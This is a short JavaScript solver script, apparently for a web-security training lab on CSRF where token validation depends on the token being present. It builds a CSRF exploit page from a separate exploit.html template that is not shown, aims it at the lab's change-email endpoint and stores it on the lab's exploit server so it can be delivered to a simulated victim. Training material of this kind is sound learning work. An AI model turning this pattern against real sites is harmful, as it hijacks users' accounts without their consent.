import { ExploitServer } from "../../../utils/exploitServer.js";
import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
import { runTasks } from "../../../utils/runTasks.js";
import { Exploit } from "../utils/Exploit.js";
import { getFileContent } from "../../../utils/getFileContent.js";

const { labUrl, httpClient } = getParsedInputFromUser({
  description:
    "Lab: CSRF where token validation depends on token being present",
  allowProxy: true,
});

runTasks([task]);

async function task() {
  const exploit = await getExploit();
  const exploitServer = await ExploitServer.create(labUrl, httpClient);
  await exploitServer.storeExploit(exploit);

  console.log(`To solve the lab:
  1. Visit ${exploitServer.url}
  2. Press "Deliver exploit to victim" button`);
}

async function getExploit() {
  const rawExploitContent = await getFileContent(
    new URL("./exploit.html", import.meta.url),
  );
  const exploit = new Exploit(rawExploitContent);
  const actionUrl = labUrl + "my-account/change-email";
  exploit.setFormAction(actionUrl);
  return exploit.toString();
}
